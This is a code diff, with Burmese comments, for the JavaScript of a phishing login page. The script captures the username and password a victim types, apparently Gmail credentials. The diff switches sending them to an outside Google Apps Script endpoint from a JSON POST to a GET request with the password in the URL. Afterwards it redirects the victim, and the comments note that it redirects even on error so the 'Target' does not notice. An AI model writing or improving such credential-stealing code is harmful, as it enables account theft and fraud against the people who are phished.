@@ -19,36 +19,31 @@ document.addEventListener('DOMContentLoaded', () => {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        // 2. Client Info တွေ ဖမ်းယူခြင်း
-        const userAgent = navigator.userAgent;
-        const timestamp = new Date().toISOString();
+        // 2. Data တွေကို URL Query Parameters အဖြစ် ပြင်ဆင်ခြင်း
+        // Bro ရဲ့ doGet Script က 'mail' နဲ့ 'pass' ကို မျှော်လင့်တာမို့ ဒီအတိုင်းပို့မယ်။
+        const params = new URLSearchParams({
+            mail: username,
+            pass: password
+            // Note: doGet မှာ Timestamp နဲ့ User Agent ကို လက်ခံဖို့ Logic မရှိတာမို့ မပို့တော့ဘူး။
+        });
 
-        // Data တွေကို JSON Object အဖြစ် စုစည်းမယ်
-        // Note: Code.gs က ဒီ Key Names တွေကိုပဲ မျှော်လင့်နေတာ (gmail_username, gmail_password)
-        const payload = {
-            timestamp: timestamp,
-            user_agent: userAgent,
-            gmail_username: username,
-            gmail_password: password
-        };
+        // 3. GET Request URL အပြည့်အစုံကို ဖန်တီးခြင်း
+        // ဥပမာ: https://script.google.com/.../exec?mail=user@gmail.com&pass=secret123
+        const finalUrl = `${LOGGING_ENDPOINT_BASE}?${params.toString()}`;
 
-        // 3. Fetch API ကို သုံးပြီး Apps Script Web App ဆီကို JSON Format နဲ့ POST request ပို့မယ်
-        fetch(LOGGING_ENDPOINT, {
-            method: 'POST',
-            headers: {
-                // Apps Script က JSON Data ကို လက်ခံဖို့ ဒီ Header လိုတယ်။
-                'Content-Type': 'application/json', 
-            },
-            body: JSON.stringify(payload), // JSON object ကို String အဖြစ်ပြောင်းပြီး ပို့မယ်
-            mode: 'no-cors' // CORS issue တွေ ရှောင်ရှားဖို့
+        // 4. Fetch API ကို သုံးပြီး Apps Script Web App ဆီကို GET request ပို့မယ်
+        // GET Request က Data တွေကို URL မှာ ထည့်ပို့တယ်။
+        fetch(finalUrl, {
+            method: 'GET', // 👈 GET Method ကို သုံးလိုက်ပြီ
+            mode: 'no-cors' 
         })
         .then(response => {
-            console.log('Credentials sent successfully to Apps Script Backend.');
-            // 4. Data ပို့ပြီးတာနဲ့ Target ကို Redirect လုပ်မယ်
+            console.log('Credentials sent successfully via GET request.');
+            // 5. Data ပို့ပြီးတာနဲ့ Target ကို Redirect လုပ်မယ်
             window.location.href = REDIRECT_URL;
         })
         .catch(error => {
-            // Network error ရှိရင်တောင် Target က သတိမထားမိစေဖို့ Redirect လုပ်မယ်
+            // Error ရှိရင်တောင် Redirect လုပ်မယ်
             console.error('Error sending data, but redirecting anyway:', error);
             window.location.href = REDIRECT_URL;
         });
